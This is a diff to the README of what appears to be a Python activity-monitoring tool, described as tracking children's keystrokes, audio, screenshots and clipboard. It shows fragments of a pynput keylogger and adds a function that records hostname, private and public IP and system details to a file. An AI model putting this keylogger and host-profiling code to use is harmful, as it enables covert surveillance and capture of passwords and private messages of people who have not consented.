@@ -24,7 +24,7 @@ To track kids activity including keystrokes, audio, screenshots, clipboard data 
 
 ## Keylogger Functionality
 
-count = 0
+    count = 0
     keys = []
 
     def on_press(key):
@@ -60,3 +60,24 @@ count = 0
 
     with Listener(on_press=on_press, on_release=on_release) as listener:
             listener.join()
+
+  ## System Information Retrival
+
+    def computer_information():
+        with open(file_path + extend + system_information, "a") as f:
+            hostname = socket.gethostname()
+            IPAddr = socket.gethostbyname(hostname)
+            try:
+                public_ip = get("https://api.ipify.org").text
+                f.write("Public IP Address: " + public_ip)
+
+            except Exception:
+                f.write("Couldn't get Public IP Address (most likely max query")
+
+            f.write("Processor: " + (platform.processor()) + '\n')
+            f.write("System: " + platform.system() + " " + platform.version() + '\n')
+            f.write("Machine: " + platform.machine() + "\n")
+            f.write("Hostname: " + hostname + "\n")
+            f.write("Private IP Address: " + IPAddr + "\n")
+
+    computer_information()
